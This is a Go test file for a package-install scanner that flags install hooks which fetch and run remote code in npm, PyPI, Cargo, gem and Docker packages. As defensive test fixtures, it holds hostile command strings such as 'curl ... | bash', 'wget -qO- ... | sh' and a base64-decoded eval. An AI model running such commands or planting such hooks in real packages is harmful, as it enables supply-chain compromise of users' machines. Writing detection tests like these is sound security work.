package installscan

import (
	"strings"
	"testing"
	"testing/quick"
)

// --- FR-106 detection semantics (PRD §5.7 acceptance criteria, detection layer) ---

func TestDetect_HighFetchExec(t *testing.T) {
	cases := []struct {
		name string
		eco  string
		hook HookFile
	}{
		{"npm postinstall curl|bash", "npm", HookFile{"package.json#scripts.postinstall", "curl https://x.example/p.sh | bash"}},
		{"npm wget|sh", "npm", HookFile{"package.json#scripts.install", "wget -qO- https://x.example/i | sh"}},
		{"pypi urlopen+os.system", "pypi", HookFile{"setup.py", "import urllib.request, os\nurllib.request.urlopen('http://x/y')\nos.system('sh payload')"}},
		{"pypi requests+subprocess", "pypi", HookFile{"setup.py", "import requests, subprocess\nr=requests.get('http://x')\nsubprocess.Popen(r.text, shell=True)"}},
		{"cargo build.rs reqwest+Command", "cargo", HookFile{"build.rs", `let b = reqwest::blocking::get("http://x").unwrap(); std::process::Command::new("sh").arg("-c").arg(b).spawn();`}},
		{"gem extconf shellout", "gem", HookFile{"ext/foo/extconf.rb", "`curl http://x/e | bash`"}},
		{"docker RUN curl|sh", "docker", HookFile{"image-config.json#history[2].created_by", "curl -fsSL http://x/i.sh | sh"}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			f := Detect(c.eco, []HookFile{c.hook})
			if f.Level != LevelHigh {
				t.Fatalf("want LevelHigh, got %v (code=%s detail=%s)", f.Level, f.Code, f.Detail)
			}
			if f.Code != CodeRemoteCodeOnInstall {
				t.Errorf("want code %q, got %q", CodeRemoteCodeOnInstall, f.Code)
			}
			if !f.Level.Blocks() {
				t.Error("HIGH must block")
			}
		})
	}
}

func TestDetect_BenignMediumAdvisory(t *testing.T) {
	// node-gyp rebuild: an install hook with NO network sink → MEDIUM advisory,
	// does not block on Gate 8 (Gate 1 age still applies independently).
	f := Detect("npm", []HookFile{{"package.json#scripts.install", "node-gyp rebuild"}})
	if f.Level != LevelMedium {
		t.Fatalf("want LevelMedium, got %v (%s)", f.Level, f.Detail)
	}
	if f.Code != CodeInstallScriptPresent {
		t.Errorf("want %q, got %q", CodeInstallScriptPresent, f.Code)
	}
	if f.Level.Blocks() {
		t.Error("MEDIUM advisory must NOT block")
	}
}

func TestDetect_GoIsNA(t *testing.T) {
	f := Detect("go", nil)
	if f.Level != LevelNA || f.Code != CodeNA {
		t.Fatalf("Go must be n/a, got level=%v code=%q", f.Level, f.Code)
	}
	if f.Level.Blocks() {
		t.Error("n/a must never block")
	}
	// Even a hostile string handed under eco=go never blocks.
	f = Detect("go", []HookFile{{"x", "curl http://x | bash"}})
	if f.Level.Blocks() {
		t.Error("Go must never false-block even with a fetch+exec string")
	}
}

func TestDetect_UnparseableFailClosed(t *testing.T) {
	// Exec of decoded/indirected content, no visible fetch → fail-closed.
	cases := []HookFile{
		{"package.json#scripts.postinstall", `eval "$(echo aHR0cDovL3ggfCBzaAo= | base64 -d)"`},
		{"setup.py", "exec(__import__('base64').b64decode(BLOB).decode())"},
		{"package.json#scripts.install", "iex (Invoke-Expression $decoded)"},
	}
	for _, h := range cases {
		f := Detect("npm", []HookFile{h})
		if f.Level != LevelFailClosed {
			t.Fatalf("hook %q: want LevelFailClosed, got %v (%s)", h.Path, f.Level, f.Detail)
		}
		if !f.Level.Blocks() {
			t.Error("fail-closed must block")
		}
	}
}

func TestDetect_NoHookIsNone(t *testing.T) {
	if f := Detect("npm", nil); f.Level != LevelNone {
		t.Fatalf("no hooks → LevelNone, got %v", f.Level)
	}
}

func TestDetect_HighWinsOverMediumAcrossHooks(t *testing.T) {
	hooks := []HookFile{
		{"package.json#scripts.preinstall", "node-gyp rebuild"},      // medium
		{"package.json#scripts.postinstall", "curl http://x | bash"}, // high
	}
	f := Detect("npm", hooks)
	if f.Level != LevelHigh {
		t.Fatalf("HIGH must win across hooks, got %v", f.Level)
	}
	if !strings.Contains(f.HookPath, "postinstall") {
		t.Errorf("HookPath should name the offending hook, got %q", f.HookPath)
	}
}

// --- Locate: full-archive → hooks, per ecosystem ---

func TestLocateNPM_ExtractsLifecycleScripts(t *testing.T) {
	pkg := `{"name":"x","version":"1.0.0","scripts":{"postinstall":"curl http://x|bash","test":"jest","prepare":"node-gyp rebuild"}}`
	hooks := Locate("npm", map[string][]byte{"package/package.json": []byte(pkg)})
	// Only lifecycle scripts (postinstall, prepare) — NOT "test".
	if len(hooks) != 2 {
		t.Fatalf("want 2 lifecycle hooks, got %d: %+v", len(hooks), hooks)
	}
	f := Detect("npm", hooks)
	if f.Level != LevelHigh {
		t.Errorf("postinstall curl|bash must be HIGH, got %v", f.Level)
	}
}

func TestLocateDocker_ParsesRUNHistory(t *testing.T) {
	cfg := `{"history":[{"created_by":"/bin/sh -c #(nop) ADD file:abc in /"},{"created_by":"RUN /bin/sh -c curl -fsSL http://x/i.sh | sh"}]}`
	hooks := Locate("docker", map[string][]byte{"image-config.json": []byte(cfg)})
	if len(hooks) == 0 {
		t.Fatal("expected at least one RUN hook")
	}
	if f := Detect("docker", hooks); f.Level != LevelHigh {
		t.Errorf("RUN curl|sh must be HIGH, got %v (%s)", f.Level, f.Detail)
	}
}

func TestLocateGem_PathConvention(t *testing.T) {
	hooks := Locate("gem", map[string][]byte{
		"ext/foo/extconf.rb": []byte("system(`curl http://x/e | bash`)"),
		"lib/foo.rb":         []byte("puts 1"), // not an ext build file
	})
	if len(hooks) != 1 {
		t.Fatalf("want 1 ext hook, got %d", len(hooks))
	}
	if f := Detect("gem", hooks); f.Level != LevelHigh {
		t.Errorf("extconf shellout must be HIGH, got %v", f.Level)
	}
}

// --- Property: no-execution invariant + determinism ---

// TestProperty_DetectNeverExecutes is a structural guarantee: Detect only reads
// strings and matches regexps. This property asserts it is a PURE FUNCTION —
// same input yields same output, no panic, on arbitrary attacker bytes. Any
// attempt to "run" a hook would require I/O the function does not perform.
func TestProperty_DetectDeterministicNoPanic(t *testing.T) {
	f := func(eco string, body string) bool {
		h := []HookFile{{Path: "x", Content: body}}
		a := Detect(eco, h)
		b := Detect(eco, h)
		return a == b // identical → pure, and it returned (no panic/hang)
	}
	if err := quick.Check(f, &quick.Config{MaxCount: 2000}); err != nil {
		t.Fatal(err)
	}
}

// TestProperty_GoNeverBlocks: for ANY input string, eco="go" never blocks.
func TestProperty_GoNeverBlocks(t *testing.T) {
	f := func(body string) bool {
		return !Detect("go", []HookFile{{Path: "x", Content: body}}).Level.Blocks()
	}
	if err := quick.Check(f, &quick.Config{MaxCount: 2000}); err != nil {
		t.Fatal(err)
	}
}

// FuzzDetect drives the highest-bypass-risk component (the install-script
// parser) with arbitrary bytes. A crash blocks merge (delta §V7 fuzz row).
func FuzzDetect(f *testing.F) {
	f.Add("npm", "curl http://x | bash")
	f.Add("pypi", "import os; os.system('x')")
	f.Add("gem", "`curl http://x`")
	f.Add("docker", `{"history":[{"created_by":"RUN sh -c x"}]}`)
	f.Add("go", "anything")
	f.Fuzz(func(t *testing.T, eco, body string) {
		got := Detect(eco, []HookFile{{Path: "fuzz", Content: body}})
		// Invariant: Go is never a block, whatever the bytes.
		if eco == "go" && got.Level.Blocks() {
			t.Fatalf("Go blocked on fuzz input %q", body)
		}
		_ = got.Message(eco, "pkg") // must not panic
	})
}
